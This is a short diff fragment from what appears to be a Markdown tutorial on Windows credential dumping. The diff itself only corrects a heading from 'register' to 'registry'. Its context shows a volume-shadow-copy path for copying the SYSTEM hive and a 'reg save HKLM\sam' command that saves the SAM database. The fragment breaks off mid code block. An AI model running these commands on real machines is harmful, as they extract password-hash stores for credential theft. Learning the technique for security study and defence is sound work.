@@ -67,7 +67,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\system32\config\sys
 
 <img src="/img/cred1/5.PNG" alt="Getting-gz" width="1000" height="200"> 
 
-## register
+## registry 
 We can also obtain a copy of the SAM database and SYSTEM files from the registry in the HKLM\sam and HKLM\system hives, respectively. Administrative permissions are required to read and copy
 ```
 reg save HKLM\sam C:\users\nored0x\Downloads\sam
